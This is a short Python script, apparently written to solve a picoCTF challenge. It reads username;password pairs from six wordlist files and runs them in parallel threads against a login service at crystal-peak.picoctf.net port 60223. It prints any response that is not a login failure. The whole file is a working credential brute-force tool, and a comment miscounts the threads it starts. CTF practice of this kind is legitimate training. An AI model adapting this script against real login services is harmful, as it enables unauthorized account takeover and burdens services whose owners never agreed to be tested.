import socket
import time
import threading


def attack(file):
    pairs= [x.strip() for x in open(file, encoding='latin-1') if x]
    c = 1
    for pair in pairs:
        print("Set", c)
        user = pair.split(';')[0] + '\n'
        passwd = pair.split(';')[1] + '\n'
        print(f"Trying: {pair.split(';')[0]}:{pair.split(';')[1]}")

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('crystal-peak.picoctf.net', 60223))
        #s.recv(1024).decode()
        time.sleep(1)
        s.sendall(user.encode('utf-8'))
        #s.recv(1024).decode()
        time.sleep(1)
        s.sendall(passwd.encode('utf-8'))
        time.sleep(1)
        c += 1
        #s.recv(1024).decode()
        if "Invalid username or password" not in s.recv(1024).decode():
            print(s.recv(1024).decode())

threads = []

# Spawn 5 different threads executing the same function
for i in range(1,7):
    t = threading.Thread(target=attack, args=(str(i)+".txt",))
    threads.append(t)
    t.start()

# Loop back to wait for all of them to finish safely
for t in threads:
    t.join()
